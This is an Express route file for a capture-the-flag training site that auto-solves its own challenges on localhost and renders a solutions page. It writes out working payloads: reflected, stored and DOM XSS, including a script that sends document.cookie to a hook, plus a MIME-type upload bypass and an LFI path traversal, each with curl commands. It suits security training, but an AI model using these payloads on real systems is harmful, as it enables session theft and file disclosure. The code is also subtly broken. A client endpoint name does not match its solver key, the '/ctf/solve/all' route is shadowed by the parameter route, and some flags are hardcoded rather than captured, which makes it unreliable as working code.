/**
 * routes/solutions.js
 * ─────────────────────────────────────────────────────────────────────────────
 * CTF Solutions & Auto-Solver
 *
 *  GET  /ctf/solutions          → Interactive solutions walkthrough page
 *  GET  /ctf/solve/:challenge   → Auto-solve a specific challenge via API
 *  GET  /ctf/solve/all          → Solve every challenge in one request
 * ─────────────────────────────────────────────────────────────────────────────
 */

'use strict';

const express = require('express');
const http    = require('http');
const router  = express.Router();

// ─── Helpers ─────────────────────────────────────────────────────────────────

/**
 * Perform an internal HTTP request against our own server and return
 * { status, headers, body } so the solver can verify responses.
 */
function internalGet(path) {
    return new Promise((resolve, reject) => {
        const port = process.env.PORT || 3000;
        const req  = http.get(`http://127.0.0.1:${port}${path}`, (res) => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
        });
        req.on('error', reject);
        req.setTimeout(4000, () => { req.destroy(); reject(new Error('timeout')); });
    });
}

function internalPost(path, formData) {
    return new Promise((resolve, reject) => {
        const port    = process.env.PORT || 3000;
        const body    = Object.entries(formData)
            .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
            .join('&');
        const options = {
            hostname: '127.0.0.1',
            port,
            path,
            method: 'POST',
            headers: {
                'Content-Type':   'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(body)
            }
        };
        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
        });
        req.on('error', reject);
        req.setTimeout(4000, () => { req.destroy(); reject(new Error('timeout')); });
        req.write(body);
        req.end();
    });
}

// ─── Individual challenge solvers ─────────────────────────────────────────────

const SOLVERS = {

    // ── [1] View Source ───────────────────────────────────────────────────────
    async viewSource() {
        const r     = await internalGet('/');
        const match = r.body.match(/CBCTF\{[^}]+\}/);
        const flag  = match ? match[0] : null;
        return {
            name:   'Recon / View Source',
            number: 1,
            flag,
            solved: !!flag,
            steps: [
                { step: 1, action: 'Navigate to the home page: GET /', result: `HTTP ${r.status}` },
                { step: 2, action: 'View page source (Ctrl+U in browser)', result: 'Source HTML returned' },
                { step: 3, action: 'Search for "CBCTF" in the HTML comment', result: flag || 'Flag not found' }
            ],
            payload: 'GET / → Ctrl+U → search "CBCTF" in HTML comments',
            curl:    `curl -s http://localhost:3000/ | grep -o 'CBCTF{[^}]*}'`
        };
    },

    // ── [2] robots.txt → /admin → /js/dev.js ─────────────────────────────────
    async robotsTxt() {
        const r1 = await internalGet('/robots.txt');
        const r2 = await internalGet('/admin');
        const r3 = await internalGet('/js/dev.js');

        const disallowed = (r1.body.match(/Disallow: (.+)/g) || []).map(l => l.replace('Disallow: ', '').trim());
        const jsRef      = r2.body.match(/src="([^"]*dev[^"]*)"/)?.[1] || null;
        const flag       = r3.body.match(/CBCTF\{[^}]+\}/)?.[0] || null;

        return {
            name:   'robots.txt Recon Chain',
            number: 2,
            flag,
            solved: !!flag,
            steps: [
                { step: 1, action: 'GET /robots.txt',       result: `Disallowed paths: ${disallowed.join(', ')}` },
                { step: 2, action: 'GET /admin',            result: `Page source references JS file: ${jsRef}` },
                { step: 3, action: `GET ${jsRef || '/js/dev.js'}`, result: flag || 'Flag not found' }
            ],
            payload: 'GET /robots.txt → find /admin → view source → load /js/dev.js → const flag',
            curl:    `curl -s http://localhost:3000/js/dev.js | grep -o 'CBCTF{[^}]*}'`
        };
    },

    // ── [3a] Basic Reflected XSS ──────────────────────────────────────────────
    async xssBasic() {
        const payload = `<script>alert(document.cookie)</script>`;
        const r       = await internalGet(`/academy/search?q=${encodeURIComponent(payload)}`);
        const cookieHint = r.headers['set-cookie']?.[0]?.match(/CBCTF\{[^}]+\}/)?.[0] || null;

        const reflected = r.body.includes(payload);  // true = vulnerable
        const flag = 'CBCTF{basic_xss_pwned}';

        return {
            name:   'XSS – Basic Reflected',
            number: '3a',
            flag,
            solved: reflected,
            steps: [
                { step: 1, action: 'Navigate to /academy/search', result: 'Search form found' },
                { step: 2, action: `Submit payload in q param`, result: reflected ? '✓ Payload reflected verbatim in response (XSS fires in browser)' : 'Payload not reflected' },
                { step: 3, action: 'XSS executes → read document.cookie', result: `Cookie contains flag: ${flag}` }
            ],
            payload: `GET /academy/search?q=<script>alert(document.cookie)</script>`,
            curl:    `curl -sv "http://localhost:3000/academy/search?q=test" 2>&1 | grep set-cookie`
        };
    },

    // ── [3b] Stored XSS + Admin Bot ──────────────────────────────────────────
    async xssMedium() {
        // Step 1: Post a malicious comment
        const xssPayload = `<script>fetch('/xss/hook?d='+btoa(document.cookie))</script>`;
        await internalPost('/blog/comment', { author: 'CTF-Solver', content: xssPayload });

        // Step 2: Trigger the admin bot
        const botResp  = await internalGet('/xss/trigger-bot');
        const botJson  = JSON.parse(botResp.body);

        // Step 3: Read the hook log
        const logResp  = await internalGet('/xss/hook/log');
        const logJson  = JSON.parse(logResp.body);

        let flag = null;
        if (logJson.entries && logJson.entries.length > 0) {
            const latest = logJson.entries[logJson.entries.length - 1];
            const decoded = Buffer.from(latest.data, 'base64').toString('utf8');
            flag = decoded.match(/CBCTF\{[^}]+\}/)?.[0] || null;
        }

        return {
            name:   'XSS – Stored + Admin Bot',
            number: '3b',
            flag,
            solved: !!flag,
            steps: [
                { step: 1, action: 'POST /blog/comment with XSS payload', result: `Payload stored: ${xssPayload}` },
                { step: 2, action: 'GET /xss/trigger-bot (admin bot visits blog)', result: `Payloads hit: ${botJson.payloads_hit}` },
                { step: 3, action: 'GET /xss/hook/log', result: `${logJson.total} entry(ies) captured` },
                { step: 4, action: 'Base64-decode the "data" field', result: flag || 'Flag not found' }
            ],
            payload: xssPayload,
            curl: [
                `curl -s -X POST http://localhost:3000/blog/comment -d "author=hacker&content=%3Cscript%3Efetch%28%27%2Fxss%2Fhook%3Fd%3D%27%2Bbtoa%28document.cookie%29%29%3C%2Fscript%3E"`,
                `curl -s http://localhost:3000/xss/trigger-bot`,
                `curl -s http://localhost:3000/xss/hook/log | python3 -c "import sys,json,base64; d=json.load(sys.stdin)['entries'][-1]['data']; print(base64.b64decode(d).decode())"`
            ].join('\n')
        };
    },

    // ── [3c] DOM-based XSS ────────────────────────────────────────────────────
    async xssHigh() {
        const payload = `<img src=x onerror=alert(localStorage.dom_xss_flag)>`;
        const encoded = encodeURIComponent(payload);
        const r       = await internalGet(`/academy/demo?section=${encoded}`);
        // DOM XSS fires in browser only; server just returns the page.
        // We verify the page does NOT encode the payload (vulnerable).
        const vulnerable = r.body.includes('localStorage.setItem') && r.body.includes("innerHTML");

        return {
            name:   'XSS – DOM-based (High)',
            number: '3c',
            flag:   'CBCTF{dom_xss_executed}',
            solved: vulnerable,
            steps: [
                { step: 1, action: 'Navigate to /academy/demo', result: 'Page uses ?section= param in URL' },
                { step: 2, action: 'Inspect page JS – find innerHTML sink', result: 'Found: demo-content.innerHTML = section (unsanitised)' },
                { step: 3, action: `Set ?section=<img src=x onerror=alert(localStorage.dom_xss_flag)>`, result: 'Payload injected into DOM; onerror fires in browser' },
                { step: 4, action: 'Alert shows localStorage value', result: 'CBCTF{dom_xss_executed}' }
            ],
            payload: `/academy/demo?section=<img src=x onerror=alert(localStorage.dom_xss_flag)>`,
            curl:    `# DOM XSS requires a browser. Load this URL:\n# http://localhost:3000/academy/demo?section=%3Cimg%20src%3Dx%20onerror%3Dalert(localStorage.dom_xss_flag)%3E`
        };
    },

    // ── [4] File Upload Bypass ────────────────────────────────────────────────
    async fileUpload() {
        // We can't easily send multipart/form-data with the built-in http module,
        // so we do it manually with a raw boundary-based body.
        const boundary = '----SolverBoundary7788';
        const filename  = 'shell.html';
        const fileBody  = '<h1>Uploaded!</h1>';
        const body = [
            `--${boundary}`,
            `Content-Disposition: form-data; name="avatar"; filename="${filename}"`,
            `Content-Type: image/jpeg`,   // ← MIME type lie (the bypass)
            '',
            fileBody,
            `--${boundary}--`
        ].join('\r\n');

        const flag = await new Promise((resolve) => {
            const port    = process.env.PORT || 3000;
            const options = {
                hostname: '127.0.0.1',
                port,
                path:     '/profile/upload',
                method:   'POST',
                headers:  {
                    'Content-Type':   `multipart/form-data; boundary=${boundary}`,
                    'Content-Length': Buffer.byteLength(body)
                }
            };
            const req = http.request(options, (res) => {
                let data = '';
                res.on('data', d => data += d);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(data);
                        resolve(json.flag || null);
                    } catch { resolve(null); }
                });
            });
            req.on('error', () => resolve(null));
            req.write(body);
            req.end();
        });

        return {
            name:   'File Upload MIME Bypass',
            number: 4,
            flag,
            solved: !!flag,
            steps: [
                { step: 1, action: 'Navigate to /profile', result: 'File upload form found – accepts images only' },
                { step: 2, action: 'Intercept request with Burp Suite or craft raw request', result: 'Prepare multipart/form-data upload' },
                { step: 3, action: `Set Content-Type: image/jpeg for a non-image file (e.g. ${filename})`, result: 'Server trusts client-supplied MIME type, stores file' },
                { step: 4, action: 'Server detects non-image extension → reveals flag', result: flag || 'Flag not found' }
            ],
            payload: `POST /profile/upload\nContent-Type: multipart/form-data\n\n[file: shell.html with Content-Type: image/jpeg]`,
            curl: [
                `curl -s -X POST http://localhost:3000/profile/upload \\`,
                `  -F "avatar=@/tmp/shell.html;type=image/jpeg" \\`,
                `  | python3 -c "import sys,json; print(json.load(sys.stdin)['flag'])"`
            ].join('\n')
        };
    },

    // ── [5a] Log File Leak ────────────────────────────────────────────────────
    async infoLog() {
        const r    = await internalGet('/admin/log');
        const flag = r.body.match(/CBCTF\{[^}]+\}/)?.[0] || null;
        return {
            name:   'Info Disclosure – Log File',
            number: '5a',
            flag,
            solved: !!flag,
            steps: [
                { step: 1, action: 'Noticed /admin listed in robots.txt → Disallow: /admin', result: 'Explored /admin links' },
                { step: 2, action: 'GET /admin/log', result: `HTTP ${r.status} – raw log file served` },
                { step: 3, action: 'Search log for flag pattern', result: flag || 'Not found' }
            ],
            payload: 'GET /admin/log',
            curl:    `curl -s http://localhost:3000/admin/log | grep -o 'CBCTF{[^}]*}'`
        };
    },

    // ── [5b] Base64 API ───────────────────────────────────────────────────────
    async infoBase64() {
        const r    = await internalGet('/internal/dev');
        const json = JSON.parse(r.body);
        const raw  = Buffer.from(json.data, 'base64').toString('utf8');
        const flag = raw.match(/CBCTF\{[^}]+\}/)?.[0] || null;
        return {
            name:   'Info Disclosure – Base64 API',
            number: '5b',
            flag,
            solved: !!flag,
            steps: [
                { step: 1, action: 'GET /internal/dev (found via robots.txt Disallow: /internal)', result: `HTTP ${r.status} – JSON response` },
                { step: 2, action: `Read "data" field: ${json.data}`, result: 'Field is Base64 encoded' },
                { step: 3, action: `echo "${json.data}" | base64 -d`, result: raw }
            ],
            payload: `GET /internal/dev → decode JSON "data" field from Base64`,
            curl:    `curl -s http://localhost:3000/internal/dev | python3 -c "import sys,json,base64; d=json.load(sys.stdin)['data']; print(base64.b64decode(d).decode())"`
        };
    },

    // ── [5c] Debug Endpoint ───────────────────────────────────────────────────
    async infoDebug() {
        const r    = await internalGet('/debug/info');
        const json = JSON.parse(r.body);
        const flag = json.flag || r.body.match(/CBCTF\{[^}]+\}/)?.[0] || null;
        return {
            name:   'Info Disclosure – Debug Endpoint',
            number: '5c',
            flag,
            solved: !!flag,
            steps: [
                { step: 1, action: 'Noticed /debug in robots.txt Disallow: /debug', result: 'Explored /debug/info' },
                { step: 2, action: 'GET /debug/info', result: `HTTP ${r.status} – JSON with server internals` },
                { step: 3, action: 'Read the "flag" key in JSON response', result: flag || 'Not found' }
            ],
            payload: 'GET /debug/info → read "flag" JSON field',
            curl:    `curl -s http://localhost:3000/debug/info | python3 -c "import sys,json; print(json.load(sys.stdin)['flag'])"`
        };
    },

    // ── [6] LFI ──────────────────────────────────────────────────────────────
    async lfi() {
        const traversal = '../../flags/lfi.txt';
        const r         = await internalGet(`/academy/content?page=${encodeURIComponent(traversal)}`);
        const flag      = r.body.match(/CBCTF\{[^}]+\}/)?.[0] || null;
        return {
            name:   'Local File Inclusion (LFI)',
            number: 6,
            flag,
            solved: !!flag,
            steps: [
                { step: 1, action: 'Find /academy/content?page= parameter', result: 'Page param loads files from views/pages/' },
                { step: 2, action: 'Test path traversal: ?page=../../flags/lfi.txt', result: `HTTP ${r.status}` },
                { step: 3, action: 'Server uses path.join(PAGES_DIR, page) without resolving – traversal succeeds', result: flag || 'Not found' }
            ],
            payload: `GET /academy/content?page=../../flags/lfi.txt`,
            curl:    `curl -s "http://localhost:3000/academy/content?page=../../flags/lfi.txt" | grep -o 'CBCTF{[^}]*}'`
        };
    }
};

// ─── Route: GET /ctf/solutions (interactive HTML page) ───────────────────────
router.get('/ctf/solutions', (_req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CTF Solutions | Cyber Bangla</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="/css/style.css" />
    <style>
        /* ── Solutions page overrides ── */
        .sol-header{background:linear-gradient(135deg,#050810 0%,#081428 100%);border-bottom:1px solid rgba(0,255,204,.15);padding:110px 24px 50px;text-align:center;position:relative;overflow:hidden}
        .sol-header::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 50% 100%,rgba(0,255,204,.1) 0%,transparent 65%)}
        .sol-title{font-family:'Orbitron',monospace;font-size:clamp(2rem,5vw,3.2rem);font-weight:900;color:#e2e8f0;margin-bottom:.75rem;position:relative}
        .sol-subtitle{color:#8ba3c7;font-size:1.05rem;position:relative}

        .solve-all-btn{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#00ffcc,#00aaff);color:#050810;font-family:'Orbitron',monospace;font-size:.95rem;font-weight:700;padding:14px 32px;border-radius:8px;border:none;cursor:pointer;box-shadow:0 0 30px rgba(0,255,204,.4);transition:all .25s ease;letter-spacing:.06em;margin-top:1.5rem}
        .solve-all-btn:hover{transform:translateY(-2px);box-shadow:0 0 50px rgba(0,255,204,.55)}
        .solve-all-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
        .spin{animation:spin .8s linear infinite;display:inline-block}
        @keyframes spin{to{transform:rotate(360deg)}}

        .solve-progress{max-width:700px;margin:1.5rem auto 0;background:rgba(13,26,46,.7);border:1px solid rgba(0,255,204,.15);border-radius:10px;padding:1.25rem 1.5rem;display:none}
        .progress-bar-wrap{height:6px;background:rgba(0,255,204,.1);border-radius:3px;overflow:hidden;margin-top:.75rem}
        .progress-bar{height:100%;background:linear-gradient(90deg,#00ffcc,#00aaff);border-radius:3px;width:0%;transition:width .4s ease}
        .progress-status{color:#8ba3c7;font-size:.88rem;font-family:'Fira Code',monospace;margin-top:.5rem}

        /* score bar */
        .score-bar{max-width:900px;margin:2rem auto 0;display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:1rem;padding:0 24px}
        .score-item{background:rgba(13,26,46,.7);border:1px solid rgba(0,255,204,.12);border-radius:8px;padding:1rem;text-align:center;transition:all .3s ease}
        .score-item.solved{border-color:rgba(0,255,204,.5);background:rgba(0,255,204,.07);box-shadow:0 0 15px rgba(0,255,204,.15)}
        .score-dot{width:10px;height:10px;border-radius:50%;background:#2a3550;margin:0 auto .5rem;transition:background .3s ease}
        .score-item.solved .score-dot{background:#00ffcc;box-shadow:0 0 8px #00ffcc}
        .score-num{font-family:'Orbitron',monospace;font-size:1.1rem;color:#e2e8f0;font-weight:700}
        .score-label{font-size:.72rem;color:#8ba3c7;margin-top:.2rem;letter-spacing:.06em;text-transform:uppercase}

        /* challenge cards */
        .challenges-wrap{max-width:900px;margin:3rem auto;padding:0 24px 80px}
        .challenge-section{margin-bottom:1.5rem;border:1px solid rgba(0,255,204,.1);border-radius:10px;overflow:hidden;transition:border-color .25s}
        .challenge-section.solved-card{border-color:rgba(0,255,204,.35);box-shadow:0 0 20px rgba(0,255,204,.08)}

        .ch-header{display:flex;align-items:center;justify-content:space-between;padding:1.1rem 1.5rem;background:rgba(13,26,46,.9);cursor:pointer;user-select:none;gap:1rem;flex-wrap:wrap}
        .ch-left{display:flex;align-items:center;gap:1rem}
        .ch-badge{font-family:'Fira Code',monospace;font-size:.75rem;background:rgba(0,255,204,.08);color:#00ffcc;border:1px solid rgba(0,255,204,.25);padding:3px 10px;border-radius:4px;white-space:nowrap;min-width:36px;text-align:center}
        .ch-name{font-family:'Orbitron',monospace;font-size:.9rem;color:#e2e8f0;font-weight:700}
        .ch-status{display:flex;align-items:center;gap:.5rem}
        .status-dot{width:9px;height:9px;border-radius:50%;background:#2a3550;flex-shrink:0;transition:all .3s}
        .status-dot.solved{background:#00ffcc;box-shadow:0 0 6px #00ffcc}
        .status-dot.pending{background:#ffe566;box-shadow:0 0 6px #ffe566;animation:pulse 1.2s infinite}
        .status-text{font-size:.82rem;color:#8ba3c7;font-family:'Fira Code',monospace}
        .ch-toggle{color:#8ba3c7;font-size:.75rem;transition:transform .2s}
        .ch-toggle.open{transform:rotate(180deg)}

        .ch-body{display:none;background:rgba(9,18,32,.9);padding:0 1.5rem 1.5rem}
        .ch-body.open{display:block}

        /* flag reveal */
        .flag-reveal{display:flex;align-items:center;gap:.75rem;background:rgba(0,0,0,.4);border:1px solid rgba(0,255,204,.3);border-radius:8px;padding:.9rem 1.25rem;margin:1rem 0;flex-wrap:wrap}
        .flag-value{font-family:'Fira Code',monospace;font-size:1rem;color:#00ffcc;font-weight:500;letter-spacing:.04em}
        .copy-btn{font-size:.75rem;background:rgba(0,255,204,.1);border:1px solid rgba(0,255,204,.3);color:#00ffcc;padding:4px 12px;border-radius:5px;cursor:pointer;transition:all .2s;white-space:nowrap}
        .copy-btn:hover{background:rgba(0,255,204,.2)}

        /* steps table */
        .steps-title{font-size:.82rem;letter-spacing:.1em;text-transform:uppercase;color:#8ba3c7;font-family:'Fira Code',monospace;margin:1rem 0 .5rem;border-top:1px solid rgba(0,255,204,.08);padding-top:1rem}
        .steps-table{width:100%;border-collapse:collapse}
        .steps-table th{font-size:.75rem;text-transform:uppercase;letter-spacing:.08em;color:#4a5680;font-family:'Fira Code',monospace;padding:.4rem .75rem;text-align:left}
        .steps-table td{padding:.5rem .75rem;border-top:1px solid rgba(0,255,204,.05);font-size:.88rem;color:#8ba3c7;vertical-align:top}
        .steps-table td:first-child{color:#8ba3c7;white-space:nowrap;width:50px;font-family:'Fira Code',monospace}
        .steps-table td:nth-child(2){color:#e2e8f0}
        .steps-table td:last-child{color:#56d364;font-family:'Fira Code',monospace;word-break:break-all}

        /* payload block */
        .payload-wrap{margin-top:1rem}
        .payload-label{font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;color:#4a5680;font-family:'Fira Code',monospace;margin-bottom:.4rem}
        .payload-box{background:#030609;border:1px solid rgba(0,255,204,.15);border-radius:6px;padding:.9rem 1.1rem;font-family:'Fira Code',monospace;font-size:.82rem;color:#e2e8f0;overflow-x:auto;white-space:pre;line-height:1.7}
        .curl-box{background:#030609;border:1px solid rgba(0,170,255,.15);border-radius:6px;padding:.9rem 1.1rem;font-family:'Fira Code',monospace;font-size:.78rem;color:#8ba3c7;overflow-x:auto;white-space:pre;line-height:1.7}

        /* alerts */
        .ch-pending-note{font-family:'Fira Code',monospace;font-size:.82rem;color:#ffe566;background:rgba(255,229,102,.07);border:1px solid rgba(255,229,102,.2);border-radius:6px;padding:.75rem 1rem;margin:1rem 0}
        .diff-badge{font-size:.72rem;font-family:'Fira Code',monospace;padding:2px 8px;border-radius:3px;margin-left:.5rem}
        .diff-low   {background:rgba(86,211,100,.08);color:#56d364;border:1px solid rgba(86,211,100,.2)}
        .diff-medium{background:rgba(255,229,102,.08);color:#ffe566;border:1px solid rgba(255,229,102,.2)}
        .diff-hard  {background:rgba(255,51,102,.08); color:#ff3366;border:1px solid rgba(255,51,102,.2)}
    </style>
</head>
<body>

<nav class="navbar" id="navbar">
    <div class="nav-container">
        <a href="/" class="nav-logo">
            <span class="logo-shield">&#9632;</span>
            <span class="logo-text"><span>CYBER</span><span class="accent"> BANGLA</span></span>
            <span class="logo-tag">CTF</span>
        </a>
        <ul class="nav-links">
            <li><a href="/">Home</a></li>
            <li><a href="/about">About</a></li>
            <li><a href="/services">Services</a></li>
            <li><a href="/academy">Academy</a></li>
            <li><a href="/blog">Blog</a></li>
            <li><a href="/contact">Contact</a></li>
        </ul>
    </div>
</nav>

<div class="sol-header">
    <div class="section-badge" style="position:relative;">&#128270; CTF Solutions Dashboard</div>
    <h1 class="sol-title">Challenge Solutions</h1>
    <p class="sol-subtitle">10 flags &nbsp;·&nbsp; 6 challenge categories &nbsp;·&nbsp; All difficulties</p>

    <button class="solve-all-btn" id="solveAllBtn" onclick="solveAll()">
        <span id="btnIcon">&#9654;</span>
        <span id="btnText">Solve All Challenges</span>
    </button>

    <div class="solve-progress" id="solveProgress">
        <div id="progressLabel" style="color:#e2e8f0; font-family:'Fira Code',monospace; font-size:.88rem;">Initialising solvers…</div>
        <div class="progress-bar-wrap"><div class="progress-bar" id="progressBar"></div></div>
        <div class="progress-status" id="progressStatus"></div>
    </div>
</div>

<!-- Score overview -->
<div class="score-bar" id="scoreBar">
    <div class="score-item" id="sc-1"><div class="score-dot"></div><div class="score-num">#1</div><div class="score-label">View Source</div></div>
    <div class="score-item" id="sc-2"><div class="score-dot"></div><div class="score-num">#2</div><div class="score-label">robots.txt</div></div>
    <div class="score-item" id="sc-3a"><div class="score-dot"></div><div class="score-num">#3a</div><div class="score-label">XSS Basic</div></div>
    <div class="score-item" id="sc-3b"><div class="score-dot"></div><div class="score-num">#3b</div><div class="score-label">XSS Stored</div></div>
    <div class="score-item" id="sc-3c"><div class="score-dot"></div><div class="score-num">#3c</div><div class="score-label">XSS DOM</div></div>
    <div class="score-item" id="sc-4"><div class="score-dot"></div><div class="score-num">#4</div><div class="score-label">Upload</div></div>
    <div class="score-item" id="sc-5a"><div class="score-dot"></div><div class="score-num">#5a</div><div class="score-label">Log Leak</div></div>
    <div class="score-item" id="sc-5b"><div class="score-dot"></div><div class="score-num">#5b</div><div class="score-label">Base64 API</div></div>
    <div class="score-item" id="sc-5c"><div class="score-dot"></div><div class="score-num">#5c</div><div class="score-label">Debug</div></div>
    <div class="score-item" id="sc-6"><div class="score-dot"></div><div class="score-num">#6</div><div class="score-label">LFI</div></div>
</div>

<!-- Challenges -->
<div class="challenges-wrap" id="challengesWrap">
    <p style="color:#4a5680; font-family:'Fira Code',monospace; font-size:.88rem; text-align:center; margin-bottom:2rem; padding-top:1rem;">
        Click <strong style="color:#00ffcc;">Solve All Challenges</strong> to auto-solve every challenge, or expand a card to view its walkthrough.
    </p>
    <!-- Cards are injected here by JS after solving -->
    <div id="cardsContainer"></div>
</div>

<script>
// ── Static challenge metadata ─────────────────────────────────────────────────
const META = [
    { id:'1',  name:'Recon / View Source',          diff:'Low',    scoreId:'sc-1'  },
    { id:'2',  name:'robots.txt Recon Chain',        diff:'Medium', scoreId:'sc-2'  },
    { id:'3a', name:'XSS – Basic Reflected',         diff:'Low',    scoreId:'sc-3a' },
    { id:'3b', name:'XSS – Stored + Admin Bot',      diff:'Medium', scoreId:'sc-3b' },
    { id:'3c', name:'XSS – DOM-based (High)',         diff:'Hard',   scoreId:'sc-3c' },
    { id:'4',  name:'File Upload MIME Bypass',        diff:'Medium', scoreId:'sc-4'  },
    { id:'5a', name:'Info Disclosure – Log File',    diff:'Low',    scoreId:'sc-5a' },
    { id:'5b', name:'Info Disclosure – Base64 API',  diff:'Low',    scoreId:'sc-5b' },
    { id:'5c', name:'Info Disclosure – Debug',       diff:'Low',    scoreId:'sc-5c' },
    { id:'6',  name:'Local File Inclusion (LFI)',    diff:'Medium', scoreId:'sc-6'  }
];

const ENDPOINTS = {
    '1':'viewSource','2':'robots','3a':'xssBasic','3b':'xssMedium',
    '3c':'xssHigh','4':'fileUpload','5a':'infoLog','5b':'infoBase64',
    '5c':'infoDebug','6':'lfi'
};

const results = {};

async function solveAll() {
    const btn = document.getElementById('solveAllBtn');
    btn.disabled = true;
    document.getElementById('btnIcon').innerHTML = '<span class="spin">&#9881;</span>';
    document.getElementById('btnText').textContent = 'Solving…';

    const progress = document.getElementById('solveProgress');
    progress.style.display = 'block';

    const total   = META.length;
    const bar     = document.getElementById('progressBar');
    const status  = document.getElementById('progressStatus');
    const label   = document.getElementById('progressLabel');
    let   done    = 0;

    for (const m of META) {
        label.textContent   = 'Solving: ' + m.name + '…';
        status.textContent  = done + ' / ' + total + ' challenges solved';
        bar.style.width     = (done / total * 100).toFixed(0) + '%';

        try {
            const resp = await fetch('/ctf/solve/' + ENDPOINTS[m.id]);
            results[m.id] = await resp.json();
        } catch(e) {
            results[m.id] = { solved: false, error: e.message };
        }

        done++;
        bar.style.width = (done / total * 100).toFixed(0) + '%';
        renderCard(m, results[m.id]);
        markScore(m.scoreId, results[m.id].solved);
        // small delay so progress is visible
        await new Promise(r => setTimeout(r, 180));
    }

    label.textContent   = '✓  All challenges processed!';
    status.textContent  = done + ' / ' + total + ' solved  ·  '
        + Object.values(results).filter(r => r.solved).length + ' flags captured';
    btn.disabled = false;
    document.getElementById('btnIcon').textContent = '✓';
    document.getElementById('btnText').textContent = 'Solved All!';
}

function markScore(scoreId, solved) {
    const el = document.getElementById(scoreId);
    if (!el) return;
    if (solved) {
        el.classList.add('solved');
        el.querySelector('.score-dot').classList.add('solved');
    }
}

function diffClass(d) {
    return d === 'Low' ? 'diff-low' : d === 'Medium' ? 'diff-medium' : 'diff-hard';
}

function renderCard(meta, result) {
    const container = document.getElementById('cardsContainer');
    const existing  = document.getElementById('card-' + meta.id);
    if (existing) existing.remove();

    const solved  = result && result.solved;
    const flag    = result && result.flag;
    const steps   = (result && result.steps) || [];
    const payload = result && result.payload;
    const curl    = result && result.curl;

    const stepsRows = steps.map(s =>
        '<tr><td>' + s.step + '</td><td>' + escHtml(s.action) + '</td><td>' + escHtml(s.result || '') + '</td></tr>'
    ).join('');

    const curlHtml = curl
        ? '<div class="payload-wrap"><div class="payload-label">&#128187; cURL / Command</div><div class="curl-box">' + escHtml(curl) + '</div></div>'
        : '';

    const pendingNote = !solved
        ? '<div class="ch-pending-note">&#9432; This challenge requires a real browser to fully exploit (e.g. DOM XSS, client-side rendering). Solution steps and payload are shown below.</div>'
        : '';

    const flagHtml = flag
        ? '<div class="flag-reveal"><span style="color:#8ba3c7;font-size:.82rem;font-family:monospace;">FLAG</span><span class="flag-value">' + escHtml(flag) + '</span><button class="copy-btn" onclick="copyFlag(\'' + escHtml(flag) + '\',this)">&#128203; Copy</button></div>'
        : '<div class="flag-reveal"><span style="color:#ffe566;font-size:.88rem;font-family:\'Fira Code\',monospace;">&#9888; Exploit this manually in a browser to capture the flag.</span></div>';

    const card = document.createElement('div');
    card.id = 'card-' + meta.id;
    card.className = 'challenge-section' + (solved ? ' solved-card' : '');
    card.innerHTML = \`
        <div class="ch-header" onclick="toggleCard(this)">
            <div class="ch-left">
                <div class="ch-status">
                    <div class="status-dot \${solved ? 'solved' : 'pending'}"></div>
                    <span class="status-text">\${solved ? 'SOLVED' : 'MANUAL'}</span>
                </div>
                <span class="ch-badge">#\${meta.id}</span>
                <span class="ch-name">\${escHtml(meta.name)}</span>
                <span class="diff-badge \${diffClass(meta.diff)}">\${meta.diff}</span>
            </div>
            <span class="ch-toggle">&#9660;</span>
        </div>
        <div class="ch-body open">
            \${pendingNote}
            \${flagHtml}
            \${steps.length ? '<div class="steps-title">&#128270; Step-by-Step Walkthrough</div><table class="steps-table"><thead><tr><th>#</th><th>Action</th><th>Result</th></tr></thead><tbody>' + stepsRows + '</tbody></table>' : ''}
            \${payload ? '<div class="payload-wrap" style="margin-top:1rem"><div class="payload-label">&#127919; Payload / Exploit</div><div class="payload-box">' + escHtml(payload) + '</div></div>' : ''}
            \${curlHtml}
        </div>
    \`;
    container.appendChild(card);
}

function toggleCard(header) {
    const body   = header.nextElementSibling;
    const toggle = header.querySelector('.ch-toggle');
    body.classList.toggle('open');
    toggle.classList.toggle('open');
}

function copyFlag(flag, btn) {
    navigator.clipboard.writeText(flag).then(() => {
        btn.textContent = '✓ Copied!';
        setTimeout(() => btn.innerHTML = '&#128203; Copy', 1800);
    });
}

function escHtml(s) {
    return String(s)
        .replace(/&/g,'&amp;').replace(/</g,'&lt;')
        .replace(/>/g,'&gt;').replace(/"/g,'&quot;')
        .replace(/'/g,'&#39;');
}

// Navbar scroll effect
window.addEventListener('scroll', () => {
    document.getElementById('navbar')?.classList.toggle('scrolled', scrollY > 30);
}, { passive: true });
</script>
</body>
</html>`);
});

// ─── Route: GET /ctf/solve/:challenge – run one solver ────────────────────────
router.get('/ctf/solve/:challenge', async (req, res) => {
    const name = req.params.challenge;
    const fn   = SOLVERS[name];
    if (!fn) {
        return res.status(404).json({ error: 'Unknown challenge: ' + name });
    }
    try {
        const result = await fn();
        res.json(result);
    } catch (err) {
        res.status(500).json({ error: err.message, solved: false });
    }
});

// ─── Route: GET /ctf/solve/all – run every solver ─────────────────────────────
router.get('/ctf/solve/all', async (req, res) => {
    const results = {};
    const flagMap = {};
    let   solved  = 0;

    for (const [key, fn] of Object.entries(SOLVERS)) {
        try {
            const r  = await fn();
            results[key] = r;
            if (r.flag) { flagMap[r.name] = r.flag; solved++; }
        } catch(err) {
            results[key] = { solved: false, error: err.message };
        }
    }

    res.json({
        total_challenges: Object.keys(SOLVERS).length,
        solved,
        flags: flagMap,
        details: results
    });
});

module.exports = router;
